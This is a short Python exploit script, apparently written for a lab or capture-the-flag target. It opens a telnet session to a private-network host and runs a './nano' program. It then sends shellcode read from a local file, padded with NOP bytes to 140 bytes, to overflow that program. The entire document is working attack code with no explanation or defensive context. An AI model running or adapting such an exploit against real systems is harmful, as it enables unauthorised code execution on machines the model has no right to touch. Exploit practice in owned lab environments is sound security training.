#! python3
import telnetlib
import time

def exploit(tn):
	
	s = tn.get_socket()
	with open('shellcode_nano', 'rb') as f:
		sc = f.read()
	sc += b'\x90'*(140-len(sc))
	s.send(b'./nano\n')
	time.sleep(0.5)

	s.send(sc + b'\n')

	print(s.recv(2048))

def main():
	tn = telnetlib.Telnet('172.16.33.91', 22222)
	exploit(tn)

if __name__ == '__main__':
	main()

